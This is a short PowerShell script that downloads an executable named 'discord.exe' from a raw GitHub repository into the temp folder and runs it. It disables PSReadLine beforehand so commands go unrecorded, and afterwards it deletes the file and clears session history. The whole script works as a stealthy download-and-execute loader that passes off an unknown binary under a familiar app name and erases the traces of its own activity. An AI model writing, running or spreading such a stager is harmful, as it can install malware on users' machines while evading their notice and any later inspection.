```powershell
# ===== CONFIG =====
$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"

# ===== DISABLE CURRENT SESSION HISTORY =====
try {
    Remove-Module PSReadLine -ErrorAction SilentlyContinue
} catch {}

# ===== TEMP FILE =====
$tempExe = Join-Path $env:TEMP "discord.exe"

# ===== DOWNLOAD =====
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

# ===== CHECK =====
if (Test-Path $tempExe) {

    Write-Host "Downloaded"

    # ===== RUN =====
    $proc = Start-Process $tempExe -PassThru

    # ===== WAIT CLOSE =====
    $proc.WaitForExit()

    # ===== DELETE TEMP =====
    Remove-Item $tempExe -Force -ErrorAction SilentlyContinue

    # ===== CLEAR SESSION HISTORY =====
    Clear-History

    Write-Host "Finished"
}
else {

    Write-Host "Download failed"

}
```
